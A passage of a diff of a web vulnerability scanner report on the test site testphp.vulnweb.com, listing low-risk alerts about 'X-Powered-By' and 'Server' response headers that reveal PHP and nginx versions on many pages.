-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=3
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=4
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/login.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
 
-  URI: http://testphp.vulnweb.com/privacy.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=1
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=2
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=3
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=4
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=5
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=6
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=7
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+
+  URI: http://testphp.vulnweb.com/signup.php
+
+  Method: GET
+
+  URI: http://testphp.vulnweb.com/cart.php
+
+  Method: POST
+
+  URI: http://testphp.vulnweb.com/guestbook.php
+
+  Method: POST
+
+  URI: http://testphp.vulnweb.com/search.php?test=query
+
+  Method: POST
+
+  URI: http://testphp.vulnweb.com/secured/newuser.php
+
+  Method: POST
+
+Alert: Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s), Risk: Low (Medium), Confidence: 2
+Description: <p>The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.</p>
+Instances:
+
+  URI: http://testphp.vulnweb.com/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/AJAX/index.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/artists.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/artists.php?artist=1
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/artists.php?artist=2
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/artists.php?artist=3
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/cart.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/categories.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/disclaimer.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/guestbook.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/hpp/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/hpp/?pp=12
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/index.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?artist=1
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?artist=2
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?artist=3
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?cat=1
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?cat=2
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?cat=3
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/listproducts.php?cat=4
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/login.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/privacy.php
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=1
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=2
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=3
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=4
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=5
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=6
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+
+  URI: http://testphp.vulnweb.com/product.php?pic=7
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/signup.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/userinfo.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: POST
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: POST
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: POST
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: POST
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
   URI: http://testphp.vulnweb.com/userinfo.php
-    Method: POST
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
 
-  Alert: Server Leaks Version Information via "Server" HTTP Response Header Field, Risk: Low (High)
-  Description: <p>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>
+  Method: POST
+  Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
 
+Alert: Server Leaks Version Information via "Server" HTTP Response Header Field, Risk: Low (High), Confidence: 3
+Description: <p>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/AJAX/styles.css
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/categories.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/disclaimer.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Flash/add.swf
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/high
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/hpp/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/hpp/?pp=12
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/images/logo.gif
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/images/remark.gif
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/index.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=3
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=3
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=4
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/login.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/privacy.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=1
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=2
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=3
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=4
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=5
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=6
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/product.php?pic=7
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/robots.txt
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/secured/style.css
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
